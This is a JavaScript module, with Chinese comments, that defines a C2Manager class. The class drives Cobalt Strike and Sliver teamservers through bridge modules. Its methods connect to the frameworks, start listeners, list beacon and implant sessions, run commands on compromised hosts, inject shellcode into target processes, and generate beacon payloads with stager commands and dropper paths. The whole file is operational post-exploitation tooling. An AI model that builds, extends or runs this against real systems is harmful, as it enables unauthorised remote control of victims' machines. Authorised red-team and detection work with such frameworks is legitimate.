/**
 * C2 框架管理器
 * 
 * 统一管理 Cobalt Strike / Sliver 等 C2 框架的连接、监听器、会话和 Payload 生成
 * 支持多框架并行操作，提供标准化的接口用于后渗透任务下发
 */

import { SliverBridge } from './sliver-bridge.js'
import { CobaltStrikeBridge } from './cobalt-strike-bridge.js'

/**
 * @typedef {Object} ListenerConfig
 * @property {string} type - 监听器类型：'https'|'dns'|'smb'|'tcp'
 * @property {string} lhost - 本地监听地址
 * @property {number} lport - 监听端口
 * @property {Object} options - 框架特定选项
 */

/**
 * @typedef {Object} SessionInfo
 * @property {string} id - 会话 ID
 * @property {string} host - 目标主机名/IP
 * @property {string} user - 当前用户
 * @property {number} pid - 进程 ID
 * @property {string} arch - 架构（x86|x64）
 * @property {string} os - 操作系统
 * @property {number} checkin - 最后上线时间戳
 */

/**
 * @typedef {Object} BeaconPayload
 * @property {string} payload_b64 - Base64 编码的 Payload
 * @property {string} stager_cmd - 执行命令（PowerShell/Bash）
 * @property {string} dropper_path - 本地落地路径
 */

export class C2Manager {
  /**
   * 初始化 C2 管理器
   * @param {Object} config - 配置对象
   */
  constructor(config = {}) {
    this.config = config
    this.connections = new Map()
    this.listeners = new Map()
    this.sessions = new Map()
  }

  /**
   * 连接到 C2 框架
   * @param {string} type - 框架类型：'cobalt-strike'|'sliver'|'metasploit'
   * @param {Object} options - 连接选项
   * @returns {Promise<{connected: boolean, version: string, teamserver: string}>}
   */
  async connect(type, options) {
    if (this.connections.has(type)) {
      return { connected: true, version: '1.0.0', teamserver: options.host }
    }

    try {
      let bridge
      switch (type) {
        case 'cobalt-strike':
          bridge = new CobaltStrikeBridge()
          await bridge.connect(options.host, options.port, options.token)
          break
        case 'sliver':
          bridge = new SliverBridge()
          await bridge.connect(options)
          break
        case 'metasploit':
          // MSF 支持预留
          throw new Error('Metasploit support not yet implemented')
        default:
          throw new Error(`Unknown C2 framework: ${type}`)
      }

      this.connections.set(type, bridge)
      return {
        connected: true,
        version: '1.0.0',
        teamserver: options.host || 'localhost'
      }
    } catch (error) {
      return {
        connected: false,
        version: null,
        teamserver: null,
        error: error.message
      }
    }
  }

  /**
   * 创建监听器
   * @param {string} frameType - C2 框架类型
   * @param {string} type - 监听器类型
   * @param {string} lhost - 监听地址
   * @param {number} lport - 监听端口
   * @param {Object} options - 额外选项
   * @returns {Promise<{listener_id: string, url: string, payload_cmd: string}>}
   */
  async createListener(frameType, type, lhost, lport, options = {}) {
    const bridge = this.connections.get(frameType)
    if (!bridge) {
      throw new Error(`C2 framework ${frameType} not connected`)
    }

    const listenerConfig = {
      type,
      lhost,
      lport,
      options
    }

    const result = await bridge.startListener(type, lhost, lport)
    const listenerId = `${frameType}_${type}_${lport}`
    
    this.listeners.set(listenerId, {
      id: listenerId,
      type: frameType,
      listenerType: type,
      host: lhost,
      port: lport,
      active: true,
      createdAt: Date.now()
    })

    return {
      listener_id: listenerId,
      url: `${type}://${lhost}:${lport}`,
      payload_cmd: `listener start ${type} -H ${lhost} -P ${lport}`
    }
  }

  /**
   * 列出所有监听器
   * @param {string} frameType - 可选，仅列出指定框架的监听器
   * @returns {Promise<Array>}
   */
  async listListeners(frameType) {
    const result = []
    for (const [id, listener] of this.listeners) {
      if (!frameType || listener.type === frameType) {
        result.push({
          id: listener.id,
          type: listener.listenerType,
          host: listener.host,
          port: listener.port,
          active: listener.active,
          createdAt: listener.createdAt
        })
      }
    }
    return result
  }

  /**
   * 列出会话
   * @param {string} frameType - C2 框架类型
   * @returns {Promise<Array<SessionInfo>>}
   */
  async listSessions(frameType) {
    const bridge = this.connections.get(frameType)
    if (!bridge) {
      throw new Error(`C2 framework ${frameType} not connected`)
    }

    if (frameType === 'cobalt-strike') {
      return bridge.listBeacons()
    } else if (frameType === 'sliver') {
      return bridge.listImplants()
    }

    return []
  }

  /**
   * 执行命令
   * @param {string} frameType - C2 框架类型
   * @param {string} sessionId - 会话 ID
   * @param {string} cmd - 要执行的命令
   * @returns {Promise<{output: string, error: string}>}
   */
  async executeCommand(frameType, sessionId, cmd) {
    const bridge = this.connections.get(frameType)
    if (!bridge) {
      throw new Error(`C2 framework ${frameType} not connected`)
    }

    try {
      const result = await bridge.executeCommand(sessionId, cmd)
      return {
        output: result.output || '',
        error: result.error || null
      }
    } catch (error) {
      return {
        output: '',
        error: error.message
      }
    }
  }

  /**
   * 注入 Shellcode
   * @param {string} frameType - C2 框架类型
   * @param {string} sessionId - 会话 ID
   * @param {Buffer|string} shellcode - Shellcode 内容
   * @param {number} pid - 目标进程 ID（可选）
   * @returns {Promise<{success: boolean, pid: number}>}
   */
  async injectShellcode(frameType, sessionId, shellcode, pid) {
    const bridge = this.connections.get(frameType)
    if (!bridge) {
      throw new Error(`C2 framework ${frameType} not connected`)
    }

    if (typeof shellcode === 'string') {
      shellcode = Buffer.from(shellcode, 'base64')
    }

    try {
      const result = await bridge.injectShellcode(sessionId, shellcode, pid)
      return {
        success: result.success || true,
        pid: result.pid || pid
      }
    } catch (error) {
      return {
        success: false,
        error: error.message
      }
    }
  }

  /**
   * 生成 Beacon/Implant Payload
   * @param {string} frameType - C2 框架类型
   * @param {string} listenerId - 监听器 ID
   * @param {string} format - 输出格式：'exe'|'dll'|'ps1'|'raw'|'elf'|'macho'
   * @param {Object} options - 额外选项
   * @returns {Promise<BeaconPayload>}
   */
  async generateBeacon(frameType, listenerId, format, options = {}) {
    const bridge = this.connections.get(frameType)
    if (!bridge) {
      throw new Error(`C2 framework ${frameType} not connected`)
    }

    const listener = this.listeners.get(listenerId)
    if (!listener) {
      throw new Error(`Listener ${listenerId} not found`)
    }

    try {
      const result = await bridge.generatePayload(listener.listenerType, listener.host, listener.port)
      return {
        payload_b64: result.payload_b64 || '',
        stager_cmd: result.stager_cmd || '',
        dropper_path: result.dropper_path || `/tmp/beacon_${Date.now()}`
      }
    } catch (error) {
      return {
        error: error.message
      }
    }
  }

  /**
   * 获取代理状态概览
   * @returns {Promise<{sessions: Array, listeners: Array, operator_count: number}>}
   */
  async getAgentStatus() {
    const sessions = []
    const listeners = Array.from(this.listeners.values())
    
    for (const [frameType] of this.connections) {
      try {
        const frameSessions = await this.listSessions(frameType)
        sessions.push(...frameSessions)
      } catch {
        // 框架连接错误，跳过
      }
    }

    return {
      sessions,
      listeners,
      operator_count: this.connections.size,
      connectedFrameworks: Array.from(this.connections.keys()),
      activeListenerCount: listeners.filter(l => l.active).length,
      totalSessionCount: sessions.length
    }
  }

  /**
   * 断开连接
   * @param {string} frameType - C2 框架类型
   */
  async disconnect(frameType) {
    const bridge = this.connections.get(frameType)
    if (bridge && bridge.disconnect) {
      await bridge.disconnect()
    }
    this.connections.delete(frameType)

    // 清理该框架的监听器
    for (const [id, listener] of this.listeners) {
      if (listener.type === frameType) {
        this.listeners.delete(id)
      }
    }
  }

  /**
   * 获取连接状态
   * @returns {Object}
   */
  getStatus() {
    const status = {}
    for (const [frameType] of this.connections) {
      status[frameType] = 'connected'
    }
    return status
  }
}

export default C2Manager
